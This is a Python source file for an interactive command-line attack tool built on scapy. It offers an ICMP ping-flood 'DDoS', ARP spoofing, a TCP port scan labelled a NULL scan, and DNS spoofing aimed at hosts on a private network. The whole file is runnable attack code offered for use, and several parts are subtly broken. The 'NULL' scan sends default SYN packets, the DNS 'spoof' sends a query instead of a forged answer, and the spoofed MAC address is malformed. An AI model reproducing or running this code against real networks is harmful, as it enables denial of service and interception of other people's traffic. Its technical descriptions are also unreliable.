from scapy.all import *
import pythonping
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.l2 import ARP
from scapy.layers.inet import TCP, IP, UDP

from helper import *
from banner_generator import print_banner


def handle_attack(args: list[str]) -> None:
    """
    Handles different attack types based on user input.
    :param args: A list of strings representing arguments passed to the script.
    :return: None
    """
    args_num = len(args)
    if args_num < 2:
        print('Invalid usage, see "help"')
        return

    target = resolve_target(args[1])
    if target == "":
        return  # Already prints an error message

    match args[0]:
        case "ddos":
            if args_num != 2:
                print('Invalid usage, see "help"')
                return
            commit_ddos(target)
        case "arp":
            if args_num != 2:
                print('Invalid usage, see "help"')
                return
            commit_arp_spoofing(target)
        case "tcp" | "portscan":
            if not 2 <= args_num <= 4:
                print('Invalid usage, see "help"')
                return
            commit_null_tcp_scan(target, *args[2:])
        case "dns":
            if args_num != 2:
                print('Invalid usage, see "help"')
                return
            commit_dns_spoofing(target)
        case _:
            print('Attack not supported! Use "help" to learn more')


def commit_ddos(target: str) -> None:
    """
    Performs a DoS attack by flooding the target with ICMP ping requests.
    :param target: The IP address of the target machine.
    :return: None
    """
    print('Committing DoS, press CTRL+C at any moment to stop.')
    try:
        while True:
            # By setting the timeout to 0, we can continuously send ping messages
            # without waiting for the response, as we don't care about it.
            pythonping.ping(target, verbose=False, timeout=0)
    except (KeyboardInterrupt, InterruptedError):
        print("\nAttack Terminated.")
    except BaseException:
        print("An exception occurred, abandoning attack.")


def commit_arp_spoofing(target: str) -> None:
    """
    Performs ARP spoofing to redirect traffic from the target.
    :param target: The IP address of the target machine **(must be private)**.
    :return: None
    """
    if not is_local_ip(target):
        print('Invalid use, please enter a private ip')
        return

    def packet_handler(packet):
        arp = packet[ARP]
        # Ensure that the packet is relevant
        if arp.op != 1 or arp.psrc != target:
            return
        send(ARP(op=2,
                 psrc=LOCAL_IP,
                 hwsrc='00:00:00:00:00',
                 pdst=target,
                 hwdst=arp.hwsrc
                 ))

    print('Committing ARP spoofing, press CTRL+C at any moment to stop.')
    sniff(prn=packet_handler, promisc=True, store=False, filter='arp')


def commit_null_tcp_scan(target: str, ports: str = "", print_closed: bool = True) -> None:
    """
    Performs a NULL TCP scan to identify open ports on the target.
    :param target: The IP address of the target machine.
    :param ports: *(optional)* A comma-separated list of ports to scan. Defaults to 20-80 if unspecified.
    :param print_closed: *(optional)* A flag indicating whether to print closed ports. Default is true.
    :return: None
    """
    try:
        port_list = extract_ports(ports)
    except ValueError:
        print("Specified ports are invalid!")
        return

    if not port_list:
        print("No ports specified, scanning ports 20-80")
        port_list = range(20, 81)

    print(f'Committing NULL TCP port scanning for {target}')
    print("┌──────┬─────────┐\n"
          "│ PORT │  STATE  │\n"
          "├──────┼─────────┤")

    try:
        for port in port_list:  # Scan first 1024 ports
            print(f"\r│ {port:<5}│ ....... │", end="")  # Displays in case port is taking time

            to_send = IP(src=LOCAL_IP, dst=target) / TCP(dport=port)
            # to_send.show()
            resp = sr1(to_send, verbose=0, timeout=1)

            if resp:
                # print(f"flags={resp[TCP].flags} | ", end="")
                if resp[TCP].flags == 0x14:  # RST
                    if print_closed:
                        print(f"\r│ {port:<5}│ closed  │")
                else:
                    print(f"\r│ {port:<5}│ open    │")
            else:
                print(f"\r│ {port:<5}│ unknown │")

        print("└──────┴─────────┘")
    except (KeyboardInterrupt, InterruptedError):
        print("\r└──────┴─────────┘\nAttack Terminated.")


def commit_dns_spoofing(target: str) -> None:
    """
    Performs DNS spoofing to redirect DNS requests to a different domain.
    :param target: The IP address of the target machine **(must be private)**.
    :return: None
    """
    if not is_local_ip(target):
        print('Invalid use, please enter a private ip')
        return

    BAIT_DOMAIN = "google.com"  # Redirects
    print(f'Committing DNS Spoofing using bait {BAIT_DOMAIN}')

    def packet_handler(packet):
        if DNS in packet:
            ip = IP(dst=target, src=LOCAL_IP)
            udp = UDP(dport=53, sport=53)  # Send back to 53 (UDP) from a spoofed port
            dns = DNS(rd=1, qd=DNSQR(qname=BAIT_DOMAIN, qtype="A"))  # Send back a spoofed DNS response
            to_send = ip/udp/dns  # Join all packet layers
            send(to_send)

    sniff(prn=packet_handler, promisc=True, store=False, filter="udp port 53")


def handle_command(cmd: list[str]) -> bool:
    """
    Handles user commands like attack, help, exit, etc.
    :param cmd: A list of strings representing the user command & arguments.
    :return: Whether to continue listening to commands (*True*) or to exit (*False*).
    """
    if len(cmd) == 0:
        print('Command not supported! Use "help" to learn more')
        return True

    match cmd[0]:
        case "attack":
            handle_attack(cmd[1:])
        case "help":
            print(HELP)
        case "exit" | "quit" | "bye":
            return False
        case _:  # Default
            print('Command not supported! Use "help" to learn more')

    return True


def main():
    print_banner()
    print(HELP)

    try:
        while handle_command(get_command().split()):
            pass
    except (KeyboardInterrupt, UnicodeDecodeError):
        print()  # Newline for bye message

    print("\nBye bye!")


if __name__ == '__main__':
    main()
